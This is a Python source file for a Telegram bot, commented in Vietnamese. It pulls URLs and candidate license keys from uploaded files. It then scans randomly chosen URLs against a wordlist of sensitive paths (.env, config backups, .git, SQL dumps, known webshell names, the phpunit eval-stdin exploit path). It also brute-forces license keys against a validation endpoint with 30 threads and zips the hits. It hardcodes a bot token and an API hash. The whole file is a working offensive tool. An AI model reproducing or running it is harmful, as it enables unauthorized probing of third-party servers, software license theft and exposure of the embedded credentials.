# bot.py - FULL VERSION (24/7 + SCAN MỌI FILE + RANDOM SCAN + AUTO CRACK)
# Bot Telegram: Nhận mọi file, trích xuất key, SCAN NGẪU NHIÊN URL từ file,
# check server, auto crack, auto pack, treo 24/7
# Yêu cầu: pip install -r requirements.txt
# Bot Token: 6320148381:AAFxGUFRqL7_lVJtfm1bYK2jYgAnmwk9wk0

import os, re, sys, json, asyncio, requests, time, zipfile, threading
import hashlib, itertools, string, signal, socket, ssl, io, csv, base64, random
import xml.etree.ElementTree as ET
from datetime import datetime
from queue import Queue
from urllib.parse import urljoin, urlparse, parse_qs
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageMediaDocument, DocumentAttributeFilename
from telethon.errors import FloodWaitError, RPCError
import dns.resolver
from bs4 import BeautifulSoup
from flask import Flask, jsonify, render_template_string

# =====================================================================
# FLASK WEB SERVER 24/7
# =====================================================================
web_app = Flask(__name__)
WEB_PORT = int(os.environ.get('PORT', 8080))

HTML_TEMPLATE = """<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Bot Checker 24/7</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:20px;padding:40px;max-width:750px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1)}
h1{text-align:center;margin-bottom:20px;font-size:28px;background:linear-gradient(90deg,#00d2ff,#3a7bd5);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.online{display:inline-block;width:15px;height:15px;background:#00ff88;border-radius:50%;animation:pulse 2s infinite}
@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,255,136,0.7)}70%{box-shadow:0 0 0 15px rgba(0,255,136,0)}100%{box-shadow:0 0 0 0 rgba(0,255,136,0)}}
.info-card{background:rgba(255,255,255,0.05);border-radius:12px;padding:15px;margin:10px 0;border:1px solid rgba(255,255,255,0.1)}
p{margin:8px 0;font-size:14px}.label{color:#aaa}.value{color:#00d2ff;font-weight:bold}.footer{text-align:center;margin-top:20px;font-size:12px;color:#666}
a{color:#00d2ff;text-decoration:none}</style><meta http-equiv="refresh" content="60"></head><body><div class="container">
<h1>🔑 Bot Auto Scanner 24/7</h1><div style="text-align:center"><span class="online"></span> <strong>Online</strong></div>
<div class="info-card"><p><span class="label">Bot:</span> <span class="value">{{ bot }}</span></p>
<p><span class="label">Uptime:</span> <span class="value">{{ uptime }}</span></p>
<p><span class="label">Keys Checked:</span> <span class="value">{{ checked }}</span></p>
<p><span class="label">Valid Keys:</span> <span class="value">{{ valid }}</span></p>
<p><span class="label">URLs Scanned:</span> <span class="value">{{ scans }}</span></p>
<p><span class="label">Vulns Found:</span> <span class="value">{{ vulns }}</span></p>
<p><span class="label">Files Processed:</span> <span class="value">{{ files }}</span></p></div>
<div class="footer"><p>Ping 60s | <a href="/health">Health Check</a></p></div></div></body></html>"""

@web_app.route('/')
def index():
    u=time.time()-stats['start_time']; h,m,s=int(u//3600),int((u%3600)//60),int(u%60)
    return render_template_string(HTML_TEMPLATE,bot=stats.get('bot_username','?'),uptime=f"{h}h{m}s{s}",
        checked=stats.get('keys_checked',0),valid=stats.get('valid_keys_found',0),
        scans=stats.get('scans_done',0),vulns=stats.get('vulns_found',0),files=stats.get('total_files',0))

@web_app.route('/health')
def health(): return jsonify({"status":"ok","uptime":time.time()-stats['start_time']})
@web_app.route('/ping')
def ping(): return "pong",200

def run_web():
    try: web_app.run(host='0.0.0.0',port=WEB_PORT,debug=False,use_reloader=False)
    except: pass

def auto_ping():
    url=os.environ.get('RENDER_EXTERNAL_URL',f'http://localhost:{WEB_PORT}')
    while True:
        time.sleep(600)
        try: requests.get(f"{url}/health",timeout=10); stats['last_ping']=datetime.now().isoformat()
        except: pass

# =====================================================================
# CẤU HÌNH
# =====================================================================
BOT_TOKEN="6320148381:AAFxGUFRqL7_lVJtfm1bYK2jYgAnmwk9wk0"
BOT_USERNAME="@checkkey_crack_bot"
DEFAULT_SERVERS={
    "server1":{"url":"http://muc-tieu.com/validate_key","param":"key","marker":"valid"},
    "server2":{"url":"http://server2.com/api/check","param":"license","marker":"success"},
}
CRACK_THREADS=30; CRACK_DELAY=0.05; KEY_CHARSET=string.ascii_uppercase+string.digits
SCAN_THREADS=50; SCAN_TIMEOUT=10

# ===== WORDLIST SCAN PATH =====
SCAN_PATHS=[
    "admin","admin.php","admin/login","wp-admin","wp-login.php","panel","cpanel",
    "config.php","config.php.bak","wp-config.php","wp-config.php.bak",
    ".env",".env.backup",".git/config","backup","backup.sql","backup.zip",
    "database.sql","dump.sql","error.log","access.log","phpinfo.php","info.php",
    "robots.txt","sitemap.xml",".htaccess","web.config","package.json",
    "api","api/","api/v1","api/users","api/login","api/admin","api/keys",
    "graphql","swagger","api-docs","docs","upload","uploads","upload.php",
    "shell.php","cmd.php","c99.php","wso.php","phpmyadmin","phpMyAdmin","pma",
    "webmail","cgi-bin/",".git/HEAD",".svn/entries",".DS_Store","Thumbs.db",
    "login","register","signin","signup","logout","profile","users",
    "adminer.php","administrator/index.php","vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "_ignition/health-check","_profiler/phpinfo","debug","debug/","dev","test",
    "staging","sandbox","beta","status","health","healthcheck","actuator/health",
]

# ===== ĐỊNH DẠNG FILE HỖ TRỢ =====
SUPPORTED_EXTENSIONS={
    '.txt','.csv','.json','.xml','.html','.htm','.log','.sql','.db',
    '.zip','.rar','.7z','.tar','.gz','.bz2',
    '.pdf','.doc','.docx','.xls','.xlsx','.ppt','.pptx',
    '.cfg','.conf','.ini','.yml','.yaml','.toml','.properties',
    '.php','.asp','.aspx','.jsp','.py','.js','.ts','.rb','.pl',
    '.env','.htaccess','.htpasswd','.backup','.bak','.old','.save',
    '.key','.lic','.license','.serial','.reg',
}
MAX_FILE_SIZE=500*1024*1024  # 500MB

# ===== THƯ MỤC =====
for p in ["./downloads/","./key_results/","./temp/","./user_data/","./scan_results/","./extracted/"]:
    os.makedirs(p,exist_ok=True)

# ===== STATS =====
stats={'start_time':time.time(),'bot_username':BOT_USERNAME,'server_url':'?','keys_checked':0,
       'valid_keys_found':0,'active_users':0,'last_check':'N/A','queue_size':0,'thread_count':0,
       'last_ping':None,'total_files':0,'total_crack_attempts':0,
       'scans_done':0,'vulns_found':0,'scan_queue_size':0,'random_scans':0}

# ===== BIẾN TOÀN CỤC =====
check_queue=Queue(); crack_queue=Queue(); scan_queue=Queue()
valid_keys=[]; queue_lock=threading.Lock()
user_settings={}; stop_flags={}; active_users_set=set()

bot=TelegramClient("bot_session",api_id=6,api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")

# =====================================================================
# HÀM TIỆN ÍCH
# =====================================================================
def save_user_settings(uid,s):
    with open(f"./user_data/{uid}.json",'w',encoding='utf-8') as f: json.dump(s,f,ensure_ascii=False,indent=2)
def load_user_settings(uid):
    try:
        with open(f"./user_data/{uid}.json",'r',encoding='utf-8') as f: return json.load(f)
    except: return {"server_url":"http://muc-tieu.com/validate_key","param_name":"key","success_marker":"valid","thread_count":10,"request_delay":0.1,"auto_pack":True,"pack_min_keys":5,"auto_crack":True,"random_scan_count":5}
def get_setting(uid,k,d=None):
    if uid not in user_settings: user_settings[uid]=load_user_settings(uid)
    return user_settings[uid].get(k,d)
def set_setting(uid,k,v):
    if uid not in user_settings: user_settings[uid]=load_user_settings(uid)
    user_settings[uid][k]=v; save_user_settings(uid,user_settings[uid])

# =====================================================================
# HÀM TRÍCH XUẤT URL TỪ TEXT (MỚI - RANDOM SCAN)
# =====================================================================
def extract_urls_from_text(text):
    """Trích xuất tất cả URL từ văn bản."""
    url_patterns=[
        r'https?://[^\s<>"\'{}|\\^`\[\]]+',
        r'ftp://[^\s<>"\'{}|\\^`\[\]]+',
        r'[a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,}[^\s<>"\'{}|\\^`\[\]]*',
    ]
    urls=[]
    for p in url_patterns:
        found=re.findall(p,text,re.I)
        urls.extend(found)
    
    # Làm sạch URL
    clean_urls=[]
    for u in urls:
        u=u.strip().rstrip('.,;:!?)]}\'"')
        if not u.startswith('http'):
            # Thêm http:// nếu có dấu hiệu domain
            if re.match(r'^[a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,}',u):
                u='http://'+u
            else:
                continue
        clean_urls.append(u)
    
    return list(set(clean_urls))

def extract_urls_from_file_comprehensive(filepath):
    """Trích xuất URL từ mọi loại file."""
    ext=os.path.splitext(filepath)[1].lower()
    all_text=""
    
    # Đọc text từ file (dùng các hàm đã có)
    if ext=='.pdf':
        try:
            from PyPDF2 import PdfReader
            reader=PdfReader(filepath)
            for page in reader.pages: all_text+=page.extract_text()+"\n"
        except:
            with open(filepath,'rb') as f:
                all_text=re.sub(rb'[^\x20-\x7e\n\r\t]',b' ',f.read()).decode('ascii','ignore')
    elif ext in ['.docx','.doc']:
        try:
            import zipfile
            from xml.etree.ElementTree import XML
            with zipfile.ZipFile(filepath) as z:
                if 'word/document.xml' in z.namelist():
                    xml_content=z.read('word/document.xml')
                    tree=XML(xml_content)
                    for p in tree.iter('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}p'):
                        for r in p.iter('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r'):
                            for t in r.iter('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t'):
                                if t.text: all_text+=t.text
                        all_text+='\n'
        except: all_text=read_file_content(filepath)
    elif ext in ['.xlsx','.xls']:
        try:
            import zipfile
            from xml.etree.ElementTree import XML
            with zipfile.ZipFile(filepath) as z:
                for name in z.namelist():
                    if 'xl/sharedStrings.xml' in name:
                        tree=XML(z.read(name))
                        for si in tree.iter('{http://schemas.openxmlformats.org/spreadsheetml/2006/main}si'):
                            for t in si.iter('{http://schemas.openxmlformats.org/spreadsheetml/2006/main}t'):
                                if t.text: all_text+=t.text+'\t'
                            all_text+='\n'
        except: all_text=read_file_content(filepath)
    elif ext in ['.zip','.rar','.7z','.tar','.gz','.bz2']:
        extract_dir=os.path.join("./extracted/",os.path.basename(filepath)+"_extracted")
        os.makedirs(extract_dir,exist_ok=True)
        try:
            import zipfile
            with zipfile.ZipFile(filepath,'r') as zf:
                zf.extractall(extract_dir)
                for root,dirs,files in os.walk(extract_dir):
                    for fn in files:
                        fp=os.path.join(root,fn)
                        if os.path.getsize(fp)<MAX_FILE_SIZE:
                            all_text+=read_file_content(fp)+"\n"
        except:
            try:
                import tarfile
                with tarfile.open(filepath,'r:*') as tf:
                    tf.extractall(extract_dir)
                    for root,dirs,files in os.walk(extract_dir):
                        for fn in files:
                            fp=os.path.join(root,fn)
                            if os.path.getsize(fp)<MAX_FILE_SIZE:
                                all_text+=read_file_content(fp)+"\n"
            except: pass
    else:
        all_text=read_file_content(filepath)
    
    return extract_urls_from_text(all_text)

def read_file_content(filepath):
    """Đọc nội dung file với encoding tự động."""
    content=""
    for enc in ['utf-8','utf-16','latin-1','cp1252','ascii','gbk','shift-jis']:
        try:
            with open(filepath,'r',encoding=enc,errors='ignore') as f:
                content=f.read()
            if content.strip(): break
        except: continue
    if not content:
        try:
            with open(filepath,'rb') as f:
                content=f.read().decode('utf-8','ignore')
        except: content=""
    return content

def extract_keys_from_text(text):
    """Trích xuất key từ text."""
    keys=[]
    patterns=[
        r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
        r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}',
        r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
        r'[A-Za-z0-9]{8}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{12}',
        r'[A-Z0-9]{16}',r'[A-Z0-9]{20}',r'[A-Za-z0-9]{32}',
        r'[A-Z0-9]+-[A-Z0-9]+-[A-Z0-9]+',
        r'[A-Z0-9]{8}-[A-Z0-9]{8}-[A-Z0-9]{8}',
    ]
    for p in patterns: keys.extend(re.findall(p,text,re.I))
    for line in text.split('\n'):
        line=line.strip()
        if line and len(line)>=6 and not line.startswith('#') and not line.startswith('//'):
            if line not in keys: keys.append(line)
    return list(set(keys))

def extract_keys_from_file_comprehensive(filepath):
    """Trích xuất key từ mọi loại file."""
    ext=os.path.splitext(filepath)[1].lower()
    all_text=""
    if ext=='.pdf':
        try:
            from PyPDF2 import PdfReader
            reader=PdfReader(filepath)
            for page in reader.pages: all_text+=page.extract_text()+"\n"
        except:
            with open(filepath,'rb') as f:
                all_text=re.sub(rb'[^\x20-\x7e\n\r\t]',b' ',f.read()).decode('ascii','ignore')
    elif ext in ['.docx','.doc']:
        try:
            import zipfile
            from xml.etree.ElementTree import XML
            with zipfile.ZipFile(filepath) as z:
                if 'word/document.xml' in z.namelist():
                    tree=XML(z.read('word/document.xml'))
                    for p in tree.iter('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}p'):
                        for r in p.iter('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r'):
                            for t in r.iter('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t'):
                                if t.text: all_text+=t.text
                        all_text+='\n'
        except: all_text=read_file_content(filepath)
    elif ext in ['.xlsx','.xls']:
        try:
            import zipfile
            from xml.etree.ElementTree import XML
            with zipfile.ZipFile(filepath) as z:
                for name in z.namelist():
                    if 'xl/sharedStrings.xml' in name:
                        tree=XML(z.read(name))
                        for si in tree.iter('{http://schemas.openxmlformats.org/spreadsheetml/2006/main}si'):
                            for t in si.iter('{http://schemas.openxmlformats.org/spreadsheetml/2006/main}t'):
                                if t.text: all_text+=t.text+'\t'
                            all_text+='\n'
        except: all_text=read_file_content(filepath)
    elif ext in ['.zip','.rar','.7z','.tar','.gz','.bz2']:
        extract_dir=os.path.join("./extracted/",os.path.basename(filepath)+"_extracted")
        os.makedirs(extract_dir,exist_ok=True)
        try:
            import zipfile
            with zipfile.ZipFile(filepath,'r') as zf:
                zf.extractall(extract_dir)
                for root,dirs,files in os.walk(extract_dir):
                    for fn in files:
                        fp=os.path.join(root,fn)
                        if os.path.getsize(fp)<MAX_FILE_SIZE:
                            all_text+=read_file_content(fp)+"\n"
        except:
            try:
                import tarfile
                with tarfile.open(filepath,'r:*') as tf:
                    tf.extractall(extract_dir)
                    for root,dirs,files in os.walk(extract_dir):
                        for fn in files:
                            fp=os.path.join(root,fn)
                            if os.path.getsize(fp)<MAX_FILE_SIZE:
                                all_text+=read_file_content(fp)+"\n"
            except: pass
    else:
        all_text=read_file_content(filepath)
    return extract_keys_from_text(all_text)

# =====================================================================
# HÀM CHECK KEY
# =====================================================================
def check_single_key(key,url,param,marker):
    try:
        r=requests.post(url,data={param:key},headers={'User-Agent':'Mozilla/5.0'},timeout=15)
        return (key,marker.lower() in r.text.lower(),r.text[:200])
    except: return (key,False,"ERROR")

def check_keys_worker(url,param,marker):
    global valid_keys,stats
    while not check_queue.empty():
        try: key=check_queue.get(timeout=1)
        except: break
        k,v,_=check_single_key(key,url,param,marker)
        with queue_lock:
            stats['keys_checked']+=1
            if v: valid_keys.append(k); stats['valid_keys_found']+=1
            stats['queue_size']=check_queue.qsize()
        time.sleep(0.05); check_queue.task_done()

def run_key_check(keys,uid):
    global valid_keys; valid_keys=[]
    url=get_setting(uid,'server_url'); param=get_setting(uid,'param_name')
    marker=get_setting(uid,'success_marker'); tc=get_setting(uid,'thread_count',10)
    stats['thread_count']=tc; stats['server_url']=url; stats['queue_size']=len(keys)
    for k in keys: check_queue.put(k)
    threads=[threading.Thread(target=check_keys_worker,args=(url,param,marker)) for _ in range(min(tc,len(keys)))]
    for t in threads: t.daemon=True; t.start()
    for t in threads: t.join()
    stats['last_check']=datetime.now().isoformat(); stats['queue_size']=0
    return valid_keys

# =====================================================================
# HÀM SCAN SERVER (RANDOM TỪ FILE)
# =====================================================================
def scan_path_worker(base_url):
    """Worker scan path trên 1 URL."""
    session=requests.Session()
    session.headers.update({'User-Agent':'Mozilla/5.0'})
    results=[]
    while not scan_queue.empty():
        try: path=scan_queue.get(timeout=1)
        except: break
        full_url=urljoin(base_url,path)
        try:
            r=session.get(full_url,timeout=SCAN_TIMEOUT,allow_redirects=False,verify=False)
            if r.status_code in [200,201,301,302,307,401,403]:
                results.append({"url":full_url,"status":r.status_code,"size":len(r.content),
                               "server":r.headers.get('Server','?'),"content_type":r.headers.get('Content-Type','?')})
        except: pass
        time.sleep(0.02); scan_queue.task_done()
    session.close()
    return results

def scan_single_url(target_url):
    """Scan 1 URL đơn lẻ."""
    results={"target":target_url,"scan_time":datetime.now().isoformat(),"paths":[],"server_info":{}}
    try: results["target_ip"]=socket.gethostbyname(urlparse(target_url).netloc)
    except: results["target_ip"]="Unknown"
    try:
        r=requests.get(target_url,timeout=10)
        results["server_info"]={"status":r.status_code,"server":r.headers.get('Server','?')}
    except: results["server_info"]={"error":"Không kết nối được"}
    
    # Nạp paths vào queue
    for p in SCAN_PATHS: scan_queue.put(p)
    
    # Chạy scan
    threads=[threading.Thread(target=scan_path_worker,args=(target_url,)) for _ in range(min(SCAN_THREADS,len(SCAN_PATHS)))]
    for t in threads: t.daemon=True; t.start()
    for t in threads: t.join()
    
    stats['scans_done']+=1
    return results

def run_random_scan(urls_list,uid,count=5):
    """Chọn ngẫu nhiên URL từ danh sách và scan."""
    if not urls_list: return []
    # Lọc URL hợp lệ
    valid_urls=[]
    for u in urls_list:
        try:
            parsed=urlparse(u)
            if parsed.scheme and parsed.netloc:
                valid_urls.append(u)
        except: continue
    
    if not valid_urls: return []
    
    # Chọn ngẫu nhiên
    scan_count=min(count,len(valid_urls))
    selected=random.sample(valid_urls,scan_count)
    
    all_results=[]
    for url in selected:
        result=scan_single_url(url)
        all_results.append(result)
        stats['random_scans']+=1
    
    # Lưu kết quả
    ts=datetime.now().strftime("%Y%m%d_%H%M%S")
    with open(f"./scan_results/random_scan_{uid}_{ts}.json",'w',encoding='utf-8') as f:
        json.dump(all_results,f,indent=2,ensure_ascii=False)
    
    return all_results

# =====================================================================
# HÀM CRACK
# =====================================================================
def generate_key_combinations(pattern):
    x_count=pattern.count('X')
    if x_count==0: yield pattern; return
    for combo in itertools.product(KEY_CHARSET,repeat=x_count):
        idx=0; result=[]
        for c in pattern:
            if c=='X': result.append(combo[idx]); idx+=1
            else: result.append(c)
        yield ''.join(result)

def crack_worker(url,param,marker,uid):
    global valid_keys,stats
    sf=stop_flags.get(uid,threading.Event())
    while not crack_queue.empty() and not sf.is_set():
        try: key=crack_queue.get(timeout=1)
        except: break
        if sf.is_set(): break
        k,v,_=check_single_key(key,url,param,marker)
        with queue_lock:
            stats['total_crack_attempts']+=1
            if v: valid_keys.append(k); stats['valid_keys_found']+=1
        time.sleep(CRACK_DELAY); crack_queue.task_done()

def run_crack(pattern,uid,max_keys=None):
    global valid_keys; valid_keys=[]
    url=get_setting(uid,'server_url'); param=get_setting(uid,'param_name')
    marker=get_setting(uid,'success_marker')
    stop_flags[uid]=threading.Event(); stats['thread_count']=CRACK_THREADS
    count=0
    for key in generate_key_combinations(pattern):
        if max_keys and count>=max_keys: break
        if stop_flags.get(uid,threading.Event()).is_set(): break
        crack_queue.put(key); count+=1
    total=crack_queue.qsize(); stats['queue_size']=total
    threads=[threading.Thread(target=crack_worker,args=(url,param,marker,uid)) for _ in range(min(CRACK_THREADS,total))]
    for t in threads: t.daemon=True; t.start()
    for t in threads: t.join()
    if uid in stop_flags: del stop_flags[uid]
    stats['last_check']=datetime.now().isoformat(); stats['queue_size']=0
    return valid_keys,total

def create_pack(keys,name="keys"):
    ts=datetime.now().strftime("%Y%m%d_%H%M%S")
    safe=re.sub(r'[^\w\-.]','_',name); base=os.path.splitext(safe)[0]
    zp=os.path.join("./key_results/",f"valid_{base}_{ts}.zip")
    tp=os.path.join("./temp/",f"valid_{base}.txt")
    with open(tp,'w',encoding='utf-8') as f: f.write('\n'.join(keys))
    with zipfile.ZipFile(zp,'w',zipfile.ZIP_DEFLATED) as zf: zf.write(tp,os.path.basename(tp))
    try: os.remove(tp)
    except: pass
    return zp,len(keys)

def auto_detect_pattern(keys_list):
    if not keys_list: return None
    sample=keys_list[0].strip()
    pattern=''
    for c in sample:
        if c.isalnum(): pattern+='X'
        else: pattern+=c
    return pattern

# =====================================================================
# XỬ LÝ LỆNH TELEGRAM
# =====================================================================
@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(event):
    u=await event.get_sender(); uid=u.id
    active_users_set.add(uid); stats['active_users']=len(active_users_set)
    await event.reply(f"""**🤖 BOT AUTO SCAN RANDOM & CRACK 24/7**
Xin chào **{u.first_name}**!

📂 **Gửi bất kỳ file nào** → Bot tự động:
1. Trích xuất tất cả URL từ file
2. **Chọn ngẫu nhiên** và scan server
3. Trích xuất tất cả key
4. Check key qua server
5. Auto crack nếu bật

🔍 **/scan [url]** - Scan 1 URL cụ thể
🎲 **/randomscan [số]** - Scan ngẫu nhiên từ file đã gửi
🔨 **/crack [pattern]** - Crack key
🔄 **/scanandcrack [url] [pattern]**
✅ **/checkkey [key]**
⚙️ **/setserver [url] [param] [marker]**
🤖 **/autocrack on/off**
📋 **/menu** - Bảng điều khiển
❓ **/help** - Hướng dẫn""")

@bot.on(events.NewMessage(pattern='/help'))
async def cmd_help(event):
    await event.reply("""**📚 HƯỚNG DẪN**

**1. GỬI FILE - AUTO SCAN RANDOM & CHECK:**
• Gửi file bất kỳ (.txt .zip .pdf .doc .csv .json...)
• Bot trích xuất URL → Chọn ngẫu nhiên → Scan server
• Bot trích xuất key → Check → Auto crack (nếu bật)
• Trả về kết quả scan + pack key hợp lệ

**2. SCAN:**
`/scan http://target.com` - Scan 1 URL
`/randomscan 10` - Scan ngẫu nhiên 10 URL từ file

**3. CRACK:**
`/crack XXXX-XXXX-XXXX`
`/scanandcrack http://target.com XXXX-XXXX-XXXX`

**4. CẤU HÌNH:**
`/setserver [url] [param] [marker]`
`/autocrack on/off`
`/setrandomscan [số]` - Số URL scan ngẫu nhiên

**5. KHÁC:**
`/stop` - Dừng | `/stats` - Thống kê""")

@bot.on(events.NewMessage(pattern='/menu'))
async def cmd_menu(event):
    btns=[[Button.inline("📂 Gửi File (Auto)",b"menu_file"),Button.inline("🎲 Random Scan",b"menu_random")],
          [Button.inline("🔍 Scan 1 URL",b"menu_scan"),Button.inline("🔄 Scan+Crack",b"menu_scancrack")],
          [Button.inline("🔨 Crack Key",b"menu_crack"),Button.inline("🤖 Auto Crack",b"menu_autocrack")],
          [Button.inline("⚙️ Cấu Hình",b"menu_config"),Button.inline("📊 Thống Kê",b"menu_stats")],
          [Button.inline("🛑 Dừng",b"menu_stop"),Button.inline("❓ Help",b"menu_help")]]
    await event.reply("**📋 BẢNG ĐIỀU KHIỂN**",buttons=btns)

@bot.on(events.CallbackQuery())
async def cb(event):
    d=event.data.decode()
    r={"menu_file":"📂 Gửi file bất kỳ - Bot tự trích xuất URL+key, scan random, check, crack",
       "menu_random":"🎲 `/randomscan [số]` - Scan ngẫu nhiên URL từ file",
       "menu_scan":"🔍 `/scan http://target.com`","menu_scancrack":"🔄 `/scanandcrack [url] [pattern]`",
       "menu_crack":"🔨 `/crack XXXX-XXXX-XXXX`","menu_autocrack":"🤖 `/autocrack on/off`",
       "menu_config":"⚙️ `/setserver [url] [param] [marker]`","menu_stats":"📊 `/stats`",
       "menu_stop":"🛑 `/stop`","menu_help":"❓ `/help`"}
    await event.answer(d)
    if d in r: await event.edit(r[d])

@bot.on(events.NewMessage(pattern='/autocrack'))
async def cmd_autocrack(event):
    uid=event.sender_id; p=event.text.split()
    if len(p)<2: await event.reply(f"🤖 Auto Crack: **{'Bật' if get_setting(uid,'auto_crack',True) else 'Tắt'}**\n`/autocrack on/off`"); return
    v=p[1].lower()
    if v in ['on','true','1','bật']: set_setting(uid,'auto_crack',True); await event.reply("✅ Auto Crack: BẬT")
    elif v in ['off','false','0','tắt']: set_setting(uid,'auto_crack',False); await event.reply("✅ Auto Crack: TẮT")

@bot.on(events.NewMessage(pattern='/setrandomscan'))
async def cmd_set_random(event):
    uid=event.sender_id; p=event.text.split()
    if len(p)<2: await event.reply(f"🎲 Số URL scan ngẫu nhiên: **{get_setting(uid,'random_scan_count',5)}**\n`/setrandomscan [số]`"); return
    try:
        n=int(p[1])
        if 1<=n<=100: set_setting(uid,'random_scan_count',n); await event.reply(f"✅ Scan ngẫu nhiên: {n} URL")
    except: await event.reply("⚠️ Số không hợp lệ")

@bot.on(events.NewMessage(pattern='/scan'))
async def cmd_scan(event):
    uid=event.sender_id; parts=event.text.split(maxsplit=1)
    if len(parts)<2: await event.reply("⚠️ `/scan http://target.com`"); return
    target=parts[1].strip()
    if not target.startswith('http'): target='http://'+target
    msg=await event.reply(f"🔍 Đang scan `{target}`...")
    def do(): 
        r=scan_single_url(target)
        asyncio.run_coroutine_threadsafe(msg.edit(f"✅ Scan xong! Paths: {len(r.get('paths',[]))}"),bot.loop)
    threading.Thread(target=do).start()

@bot.on(events.NewMessage(pattern='/randomscan'))
async def cmd_random_scan(event):
    """Lệnh /randomscan - Scan ngẫu nhiên URL từ file đã gửi gần nhất."""
    uid=event.sender_id; parts=event.text.split()
    count=get_setting(uid,'random_scan_count',5)
    if len(parts)>=2:
        try: count=int(parts[1])
        except: pass
    
    # Lấy file gần nhất của user
    user_dir=os.path.join("./downloads/")
    files=[f for f in os.listdir(user_dir) if f.startswith(str(uid))]
    if not files:
        await event.reply("⚠️ Chưa có file nào! Gửi file trước rồi dùng `/randomscan`.")
        return
    
    latest_file=max([os.path.join(user_dir,f) for f in files],key=os.path.getmtime)
    
    msg=await event.reply(f"🎲 Đang trích xuất URL từ file và scan ngẫu nhiên {count} URL...")
    
    def do():
        urls=extract_urls_from_file_comprehensive(latest_file)
        if not urls:
            asyncio.run_coroutine_threadsafe(msg.edit("⚠️ Không tìm thấy URL nào trong file!"),bot.loop)
            return
        
        asyncio.run_coroutine_threadsafe(msg.edit(f"🎲 Tìm thấy {len(urls)} URL. Đang scan ngẫu nhiên {min(count,len(urls))}..."),bot.loop)
        results=run_random_scan(urls,uid,count)
        
        report=f"✅ **RANDOM SCAN HOÀN THÀNH**\n• URL tìm thấy: {len(urls)}\n• Đã scan: {len(results)}\n\n"
        for i,r in enumerate(results,1):
            report+=f"**{i}.** `{r['target']}`\n"
            report+=f"   IP: `{r.get('target_ip','?')}` | Server: `{r.get('server_info',{}).get('server','?')}`\n"
            report+=f"   Paths found: {len(r.get('paths',[]))}\n\n"
        
        asyncio.run_coroutine_threadsafe(msg.edit(report[:4000]),bot.loop)
    
    threading.Thread(target=do).start()

@bot.on(events.NewMessage(pattern='/scanandcrack'))
async def cmd_scan_and_crack(event):
    uid=event.sender_id; parts=event.text.split(maxsplit=2)
    if len(parts)<3: await event.reply("⚠️ `/scanandcrack [url] [pattern]`"); return
    target=parts[1].strip(); pattern=parts[2].strip().upper()
    if not target.startswith('http'): target='http://'+target
    total=len(KEY_CHARSET)**pattern.count('X')
    msg=await event.reply(f"🔄 Scan `{target}` + Crack `{pattern}` ({total:,})...")
    def do():
        scan=scan_single_url(target)
        valid,total_c=run_crack(pattern,uid)
        if valid:
            zp,_=create_pack(valid,f"crack_{pattern}")
            asyncio.run_coroutine_threadsafe(msg.edit(f"✅ Scan+Crack xong! Valid: {len(valid)}"),bot.loop)
            asyncio.run_coroutine_threadsafe(bot.send_file(event.chat_id,zp,caption=f"🔄 {pattern} | {len(valid)} valid"),bot.loop)
        else:
            asyncio.run_coroutine_threadsafe(msg.edit(f"❌ Không tìm thấy key"),bot.loop)
    threading.Thread(target=do).start()

@bot.on(events.NewMessage(pattern='/checkkey'))
async def cmd_check(event):
    uid=event.sender_id; parts=event.text.split(maxsplit=1)
    if len(parts)<2: await event.reply("⚠️ `/checkkey KEY`"); return
    key=parts[1].strip()
    url=get_setting(uid,'server_url'); param=get_setting(uid,'param_name')
    marker=get_setting(uid,'success_marker')
    k,v,_=check_single_key(key,url,param,marker)
    await event.reply(f"{'✅ HỢP LỆ' if v else '❌ KHÔNG HỢP LỆ'}: `{k}`")

@bot.on(events.NewMessage(pattern='/crack'))
async def cmd_crack(event):
    uid=event.sender_id; parts=event.text.split(maxsplit=1)
    if len(parts)<2: await event.reply("⚠️ `/crack XXXX-XXXX-XXXX`"); return
    pattern=parts[1].strip().upper()
    if pattern.count('X')==0: await event.reply("⚠️ Cần X"); return
    total=len(KEY_CHARSET)**pattern.count('X')
    msg=await event.reply(f"🔨 Crack `{pattern}` ({total:,})...")
    valid,ttl=run_crack(pattern,uid)
    if valid:
        zp,_=create_pack(valid,f"crack_{pattern}")
        await msg.edit(f"✅ {len(valid)} valid keys!")
        await bot.send_file(event.chat_id,zp,caption=f"🔨 {pattern} | {len(valid)} valid")
    else: await msg.edit(f"❌ Không tìm thấy key / {ttl} lần thử")

@bot.on(events.NewMessage(pattern='/stop'))
async def cmd_stop(event):
    uid=event.sender_id; stop_flags[uid]=threading.Event(); stop_flags[uid].set()
    await event.reply("🛑 Đã dừng!")

@bot.on(events.NewMessage(pattern='/status'))
async def cmd_status(event):
    u=time.time()-stats['start_time']; h,m,s=int(u//3600),int((u%3600)//60),int(u%60)
    await event.reply(f"""🌐 **24/7 ONLINE**
⏱️ {h}h{m}m{s}s | ✅ Online
🔑 Checked: {stats['keys_checked']} | Valid: {stats['valid_keys_found']}
🔍 Scans: {stats['scans_done']} | Random: {stats['random_scans']}
